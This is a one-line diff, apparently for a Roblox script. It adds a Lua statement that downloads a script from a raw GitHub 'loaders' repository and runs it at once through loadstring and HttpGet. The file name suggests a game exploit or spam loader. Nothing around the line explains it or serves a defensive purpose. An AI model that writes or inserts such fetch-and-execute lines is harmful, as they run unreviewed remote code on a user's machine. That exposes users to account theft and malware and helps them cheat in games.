@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/makeup-star-spam7-vpwt5hutii44tl.lua"))()
